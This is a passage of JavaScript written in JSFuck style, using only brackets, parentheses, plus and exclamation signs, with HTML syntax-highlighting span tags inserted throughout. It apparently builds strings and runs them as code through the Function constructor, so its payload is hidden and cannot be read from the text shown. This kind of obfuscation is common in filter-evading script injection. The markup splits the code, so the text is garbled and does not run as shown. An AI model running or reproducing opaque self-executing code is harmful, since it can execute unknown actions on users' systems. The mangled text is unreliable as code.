class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">+!+[</span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">+[</span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+[<span class="string">+[</span>]]+[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]][<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]((!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(+[<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+!+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(+(!+[<span class="string"></span>]+!+[<span class="string"></span>]+[<span class="string">+!+[</span>]]+[<span class="string">+!+[</span>]]))[<span class="string">(!![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(+![<span class="string"></span>]+([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(+![<span class="string"></span>]+[<span class="string">![</span>]]+([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+[<span class="string">+[</span>]]]](!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+[<span class="string">+!+[</span>]])[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]])()([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]][<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]((!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(+[<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+!+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(+(!+[<span class="string"></span>]+!+[<span class="string"></span>]+[<span class="string">+!+[</span>]]+[<span class="string">+!+[</span>]]))[<span class="string">(!![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(+![<span class="string"></span>]+([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span 